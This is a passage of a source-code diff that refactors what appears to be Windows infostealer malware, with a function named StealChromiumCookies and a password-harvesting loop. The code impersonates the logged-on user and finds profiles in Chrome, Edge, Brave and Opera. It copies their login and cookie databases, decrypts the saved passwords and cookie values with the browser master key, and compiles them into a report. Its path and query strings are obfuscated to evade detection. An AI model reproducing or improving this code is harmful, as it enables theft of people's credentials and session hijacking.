+            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);
 
             for (const auto& searchPath : searchPaths) {
-                if (!fs::exists(searchPath)) continue;
+                std::vector<std::string> profiles;
+                if (fs::exists(searchPath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc))))) {
+                    profiles.push_back("");
+                }
+                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
+                if (fs::exists(searchPath + "\\" + dName)) {
+                    profiles.push_back(dName);
+                }
+
                 try {
-                    for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
-                        try {
-                            const auto& entry = *it;
-                            if (entry.path().filename().string() == utils::ws2s(utils::DecryptW(kLoginDataEnc, sizeof(kLoginDataEnc)/sizeof(kLoginDataEnc[0])))) {
-                                std::string loginData = entry.path().string();
-
-                                char tempPath[MAX_PATH];
-                                GetTempPathA(MAX_PATH, tempPath);
-                                std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
-
-                                SafeCopyDatabase(loginData, tempDb);
-
-                                sqlite3* db;
-                                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, sizeof(kQueryLoginsEnc)/sizeof(kQueryLoginsEnc[0])));
-                                    const char* query = query_str.c_str();
-                                    sqlite3_stmt* stmt;
-                                    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                            const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
-                                            const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
-                                            if (!url_ptr || !user_ptr) continue;
-
-                                            std::string url = url_ptr;
-                                            std::string username = user_ptr;
-                                            const void* blob = sqlite3_column_blob(stmt, 2);
-                                            int blobLen = sqlite3_column_bytes(stmt, 2);
-
-                                            if (blobLen > 0) {
-                                                std::vector<BYTE> encryptedPass((BYTE*)blob, (BYTE*)blob + blobLen);
-                                                std::string password = DecryptPassword(encryptedPass, key);
-
-                                                if (!password.empty() && !username.empty()) {
-                                                    report += browser.name + " | " + url + " | " + username + " | " + password + "\n";
-                                                }
-                                            }
-                                        }
-                                        sqlite3_finalize(stmt);
-                                    }
-                                    sqlite3_close(db);
-                                } else {
-                                    if (db) {
-                                        LOG_DEBUG("SQLite open failed for " + browser.name + ": " + std::string(sqlite3_errmsg(db)));
-                                        sqlite3_close(db);
-                                    }
-                                }
-                                SafeDeleteDatabase(tempDb);
-                            }
-                        } catch (...) {}
-
-                        if (it.depth() > 3) it.disable_recursion_pending();
+                    for (const auto& entry : fs::directory_iterator(searchPath)) {
+                        if (entry.is_directory()) {
+                            std::string name = entry.path().filename().string();
+                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
+                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
+                        }
                     }
                 } catch (...) {}
+
+                for (const auto& profile : profiles) {
+                    std::string profilePath = profile.empty() ? searchPath : (searchPath + "\\" + profile);
+                    std::string loginData = profilePath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc)));
+
+                    if (!fs::exists(loginData)) continue;
+
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
+                    SafeCopyDatabase(loginData, tempDb);
+
+                    sqlite3* db;
+                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                        std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, wcslen(kQueryLoginsEnc)));
+                        sqlite3_stmt* stmt;
+                        if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
+                            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                const char* url = (const char*)sqlite3_column_text(stmt, 0);
+                                const char* user = (const char*)sqlite3_column_text(stmt, 1);
+                                const void* blob = sqlite3_column_blob(stmt, 2);
+                                int blobLen = sqlite3_column_bytes(stmt, 2);
+
+                                if (url && user && blobLen > 0) {
+                                    std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
+                                    std::string pass = DecryptPassword(encrypted, key, browser.name);
+                                    if (!pass.empty()) {
+                                        report += browser.name + " | " + profile + " | " + url + " | " + user + " | " + pass + "\n";
+                                    }
+                                }
+                            }
+                            sqlite3_finalize(stmt);
+                        }
+                        sqlite3_close(db);
+                    }
+                    SafeDeleteDatabase(tempDb);
+                }
             }
         }
 
@@ -285,22 +309,17 @@ namespace credential {
 
     std::string StealChromiumCookies() {
         bool impersonated = utils::ImpersonateLoggedOnUser();
-        std::stringstream resultSS;
-        resultSS << "# CHROMIUM COOKIE STEALER RESULTS\n";
-        if (!impersonated) resultSS << "# [!] Impersonation failed.\n";
-        int cookieCount = 0;
+        std::stringstream ss;
+        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
+        if (impersonated) ss << "# [+] Running with impersonated user token.\n";
+        int count = 0;
 
         char path[MAX_PATH];
-        char appDataPath[MAX_PATH];
         std::string localAppData = "";
         std::string roamingAppData = "";
 
-        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
-            localAppData = path;
-        }
-        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
-            roamingAppData = appDataPath;
-        }
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) localAppData = path;
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) roamingAppData = path;
 
         struct BrowserPath {
             std::string name;
@@ -309,105 +328,96 @@ namespace credential {
         };
 
         std::vector<BrowserPath> browsers = {
-            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, sizeof(kChromePathEnc)/sizeof(kChromePathEnc[0]))), ""},
-            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, sizeof(kEdgePathEnc)/sizeof(kEdgePathEnc[0]))), ""},
-            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, sizeof(kBravePathEnc)/sizeof(kBravePathEnc[0]))), ""},
-            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, sizeof(kOperaPathEnc)/sizeof(kOperaPathEnc[0])))},
-            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0]))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, sizeof(kOperaGxPathEnc)/sizeof(kOperaGxPathEnc[0])))}
+            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
+            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
+            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
+            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
+            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
         };
 
         for (const auto& browser : browsers) {
-            std::string localState;
-            if (fs::exists(browser.localPath)) {
-                localState = browser.localPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
-            }
+            std::string localStateDir = browser.localPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
+            if (localStateDir.empty() || !fs::exists(localStateDir)) continue;
 
-            if (localState.empty() || !fs::exists(localState)) {
-                 if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) {
-                     std::string altState = browser.roamingPath + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, sizeof(kLocalStateEnc)/sizeof(kLocalStateEnc[0])));
-                     if (fs::exists(altState)) localState = altState;
-                 }
-            }
-
-            if (localState.empty() || !fs::exists(localState)) continue;
-
+            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
             std::vector<BYTE> key = GetMasterKey(localState);
 
             std::vector<std::string> searchPaths;
-            if (!browser.localPath.empty()) searchPaths.push_back(browser.localPath);
-            if (!browser.roamingPath.empty() && browser.roamingPath != browser.localPath) searchPaths.push_back(browser.roamingPath);
+            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
+            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);
 
             for (const auto& searchPath : searchPaths) {
-                if (!fs::exists(searchPath)) continue;
+                std::vector<std::string> profiles;
+                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
+                if (fs::exists(searchPath + "\\" + dName)) {
+                    profiles.push_back(dName);
+                }
+                std::string networkName = utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc)));
+                std::string cookiesName = utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                if (fs::exists(searchPath + "\\" + networkName + "\\" + cookiesName) ||
+                    fs::exists(searchPath + "\\" + cookiesName)) {
+                    profiles.push_back("");
+                }
+
                 try {
-                    for (auto it = fs::recursive_directory_iterator(searchPath); it != fs::recursive_directory_iterator(); ++it) {
-                        try {
-                            const auto& entry = *it;
-                            std::string filename = entry.path().filename().string();
-
-                            if (filename == utils::ws2s(utils::DecryptW(kCookiesEnc, sizeof(kCookiesEnc)/sizeof(kCookiesEnc[0])))) {
-                                std::string cookiesPath = entry.path().string();
-
-                                char tempPath[MAX_PATH];
-                                GetTempPathA(MAX_PATH, tempPath);
-                                std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
-
-                                SafeCopyDatabase(cookiesPath, tempDb);
-
-                                sqlite3* db;
-                                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, sizeof(kQueryCookiesEnc)/sizeof(kQueryCookiesEnc[0])));
-                                    const char* query = query_str.c_str();
-                                    sqlite3_stmt* stmt;
-                                    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
-                                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
-                                            const char* cpath = (const char*)sqlite3_column_text(stmt, 1);
-                                            int isSecure = sqlite3_column_int(stmt, 2);
-                                            sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
-                                            const char* name = (const char*)sqlite3_column_text(stmt, 4);
-
-                                            const void* blob = sqlite3_column_blob(stmt, 5);
-                                            int blobLen = sqlite3_column_bytes(stmt, 5);
-
-                                            if (blobLen > 0) {
-                                                std::vector<BYTE> encryptedVal((BYTE*)blob, (BYTE*)blob + blobLen);
-                                                std::string value = DecryptPassword(encryptedVal, key);
-
-                                                if (!value.empty()) {
-                                                    long long unixExpiry = (expiry / 1000000) - 11644473600LL;
-                                                    if (unixExpiry < 0) unixExpiry = 0;
-
-                                                    resultSS << (host ? host : "") << "\t"
-                                                             << ((host && *host == '.') ? "TRUE" : "FALSE") << "\t"
-                                                             << (cpath ? cpath : "") << "\t"
-                                                             << (isSecure ? "TRUE" : "FALSE") << "\t"
-                                                             << unixExpiry << "\t"
-                                                             << (name ? name : "") << "\t"
-                                                             << value << "\n";
-                                                    cookieCount++;
-                                                }
-                                            }
-                                        }
-                                        sqlite3_finalize(stmt);
-                                    }
-                                    sqlite3_close(db);
-                                }
-                                SafeDeleteDatabase(tempDb);
-                            }
-                        } catch (...) {}
-
-                        if (it.depth() > 3) it.disable_recursion_pending();
+                    for (const auto& entry : fs::directory_iterator(searchPath)) {
+                        if (entry.is_directory()) {
+                            std::string name = entry.path().filename().string();
+                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
+                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
+                        }
                     }
                 } catch (...) {}
+
+                for (const auto& profile : profiles) {
+                    std::string profileBase = profile.empty() ? searchPath : (searchPath + "\\" + profile);
+                    std::string cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc))) + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                    if (!fs::exists(cookiesPath)) {
+                        cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                    }
+
+                    if (!fs::exists(cookiesPath)) continue;
+
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
+                    SafeCopyDatabase(cookiesPath, tempDb);
+
+                    sqlite3* db;
+                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                        std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, wcslen(kQueryCookiesEnc)));
+                        sqlite3_stmt* stmt;
+                        if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
+                            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                const char* host = (const char*)sqlite3_column_text(stmt, 0);
+                                const char* name = (const char*)sqlite3_column_text(stmt, 1);
+                                const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
+                                const void* blob = sqlite3_column_blob(stmt, 3);
+                                int blobLen = sqlite3_column_bytes(stmt, 3);
+                                sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);
+
+                                if (host && name && cpath && blobLen > 0) {
+                                    std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
+                                    std::string val = DecryptPassword(encrypted, key, browser.name);
+                                    if (!val.empty()) {
+                                        ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << cpath << "\t" << "TRUE\t" << expiry << "\t" << name << "\t" << val << "\n";
+                                        count++;
+                                    }
+                                }
+                            }
+                            sqlite3_finalize(stmt);
+                        }
+                        sqlite3_close(db);
+                    }
+                    SafeDeleteDatabase(tempDb);
+                }
             }
         }
 
-        std::stringstream finalOut;
-        finalOut << "# Total Chromium cookies extracted: " << cookieCount << "\n";
-        finalOut << resultSS.str();
         if (impersonated) utils::RevertToSelf();
-        return finalOut.str();
+        std::stringstream finalSS;
+        finalSS << "# Total cookies: " << count << "\n" << ss.str();
+        return finalSS.str();
     }
-
 }
